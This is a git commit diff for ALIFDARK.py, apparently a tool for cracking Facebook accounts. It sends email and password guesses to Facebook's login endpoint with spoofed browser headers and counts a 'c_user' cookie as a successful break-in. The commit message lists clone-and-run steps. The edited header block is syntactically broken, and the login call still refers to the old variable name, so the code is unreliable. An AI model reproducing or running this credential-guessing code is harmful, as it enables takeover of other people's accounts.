f7612bfc3b9032464f1a675e92bd50ed2144916c
White7778 <112792176+White7778@users.noreply.github.com>
2023-03-06 07:58:28 +0600

    Update ALIFDARK.py
    rm -rf ALIFDARK
    git clone https://github.com/White7778/ALIFDARK.git
    ls
    cd ALIFDARK
    python ALIFDARK.py

--- ALIFDARK.py
+++ ALIFDARK.py
@@ -527,22 +527,21 @@ def m(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header = {"authority": 'free.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=0.9',
-            "cache-control": 'no-cache',
-            "pragma": 'no-cache',
-            "referer": 'https://free.facebook.com/',
-            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-            "sec-ch-ua-mobile": '?0',
-            "sec-ch-ua-platform":'"Windows"',
-            "sec-fetch-dest": 'manifest',
-            "sec-fetch-mode": 'cors',
-            "sec-fetch-site": 'same-origin',
-            "user-agent":ff}
+            headers = {'authority': 'mbasic.facebook.com',}
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
